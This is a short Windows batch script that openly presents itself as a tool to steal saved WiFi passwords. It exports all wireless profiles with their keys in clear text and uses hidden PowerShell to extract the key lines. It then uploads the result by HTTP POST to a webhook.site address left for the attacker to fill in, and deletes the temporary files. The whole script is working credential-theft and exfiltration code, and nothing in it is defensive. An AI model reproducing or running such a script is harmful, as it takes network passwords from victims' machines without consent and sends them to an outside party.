@echo off
REM Batch Script to Steal Saved WiFi Password
REM Author - DARK_BLACK

start /min "" "%~f0"
exit

timeout /t 2 /nobreak >nul

cd %temp%

timeout /t 1 /nobreak >nul

netsh wlan export profile key=clear

timeout /t 2 /nobreak >nul

powershell -WindowStyle Hidden -Command "Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key"

timeout /t 2 /nobreak >nul

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri https://webhook.site/<paste webhook unique id here> -Method POST -InFile WiFi-Key"

timeout /t 2 /nobreak >nul

del Wi* /s /f /q

timeout /t 1 /nobreak >nul

exit